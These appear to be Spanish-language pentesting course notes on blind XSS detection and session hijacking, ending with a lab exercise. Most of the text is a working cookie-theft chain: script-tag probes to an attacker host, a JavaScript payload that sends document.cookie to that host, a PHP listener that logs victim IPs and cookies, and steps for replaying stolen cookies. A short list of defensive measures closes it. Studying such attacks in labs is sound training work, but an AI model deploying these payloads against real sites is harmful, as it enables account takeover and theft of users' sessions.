###  **Session Hijacking** y **Blind XSS Detection**

---

#### **Session Hijacking (Secuestro de Sesión)**

**Concepto**  
El secuestro de sesión ocurre cuando un atacante obtiene las cookies de sesión de un usuario legítimo y las utiliza para acceder a su cuenta sin necesidad de conocer las credenciales.

1. **Cookies y sesiones**:
    
    - Las aplicaciones web modernas usan cookies para mantener sesiones activas.
    - Si un atacante obtiene acceso a las cookies de un usuario, puede suplantar su identidad en la aplicación.
2. **Proceso general**:
    
    - Utilizar una vulnerabilidad de XSS para inyectar un payload malicioso que capture las cookies.
    - Transmitir las cookies al servidor del atacante para explotarlas.

---

#### **Blind XSS (XSS Ciego)**

**Concepto**  
Una vulnerabilidad Blind XSS ocurre cuando el atacante no puede visualizar directamente cómo se procesa la entrada que inyecta. Esto sucede, por ejemplo, cuando los datos son visualizados en un panel restringido, como el de un administrador.

1. **Características de Blind XSS**:
    
    - Generalmente afecta formularios que solo el administrador puede ver (e.g., tickets de soporte, formularios de contacto).
    - El atacante no tiene acceso directo para comprobar la ejecución del script.
2. **Método para detección**:
    
    - Incluir un payload con un `<script>` que apunte a un servidor controlado por el atacante.
    - Si el script es ejecutado, el servidor recibirá una petición, indicando que el campo es vulnerable.

**Ejemplo de Payload**:

```html
<script src="http://OUR_IP/username"></script>
```

---

#### **Preparación del Entorno**

1. **Configuración de un servidor de escucha**:
    
    - Crear un servidor local con PHP:
        
        ```bash
        mkdir /tmp/tmpserver
        cd /tmp/tmpserver
        sudo php -S 0.0.0.0:80
        ```
        
2. **Uso de un Payload**:
    
    - Insertar el payload en diferentes campos del formulario, indicando el nombre del campo en la URL del script para identificar cuál es vulnerable.
    - Ejemplo:
        
        ```html
        <script src="http://OUR_IP/fullname"></script>
        <script src="http://OUR_IP/username"></script>
        ```
        
3. **Validaciones adicionales**:
    
    - Campos como correos electrónicos pueden ser validados en el backend y no ser vulnerables.
    - Los campos de contraseña, debido al hashing, también suelen ser seguros.

---

#### **Explotación: Session Hijacking**

1. **Creación del Payload de Cookie Stealing**:
    
    - JavaScript para capturar las cookies y enviarlas al servidor atacante:
        
        ```javascript
        new Image().src='http://OUR_IP/index.php?c='+document.cookie;
        ```
        
2. **Hostear el Payload en el servidor**:
    
    - Crear un archivo `script.js` con el contenido anterior:
        
        ```javascript
        new Image().src='http://OUR_IP/index.php?c='+document.cookie;
        ```
        
    - Cambiar el payload del XSS para que apunte a este script:
        
        ```html
        <script src="http://OUR_IP/script.js"></script>
        ```
        
3. **PHP para recibir y almacenar cookies**:
    
    - Guardar un archivo `index.php` con el siguiente código:
        
        ```php
        <?php
        if (isset($_GET['c'])) {
            $list = explode(";", $_GET['c']);
            foreach ($list as $key => $value) {
                $cookie = urldecode($value);
                $file = fopen("cookies.txt", "a+");
                fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
                fclose($file);
            }
        }
        ?>
        ```
        
4. **Ejecución del ataque**:
    
    - Esperar a que el administrador o víctima visite la página vulnerable.
    - Verificar en los logs o en el archivo `cookies.txt` para obtener las cookies.

---

#### **Uso de las Cookies Robadas**

1. **Simulación de la sesión de la víctima**:
    
    - Navegar al sitio objetivo (e.g., `/login.php`).
    - Abrir las herramientas de desarrollador en el navegador (Shift + F9 en Firefox).
    - Agregar una nueva cookie:
        - **Nombre**: Parte antes del `=`.
        - **Valor**: Parte después del `=`.
2. **Acceso como víctima**:
    
    - Refrescar la página para simular la sesión.

---

### **Notas finales**

- **Blind XSS** requiere de pruebas exhaustivas para identificar campos vulnerables.
- **Session Hijacking** puede ser detectado y prevenido con medidas como:
    - Uso de cookies seguras (`HttpOnly`, `Secure`, `SameSite`).
    - Validaciones en el backend y restricciones en las entradas del usuario.
    - Monitoreo de actividades sospechosas.


### Ejercicio

Probamos todos los campos con 
`"><script src=http://10.10.14.193:8080/tetas></script>`
y vemos que el campo email es vulnerable
por lo que procedemos a injectar el script que obtendra la cookie del administrador del sitio
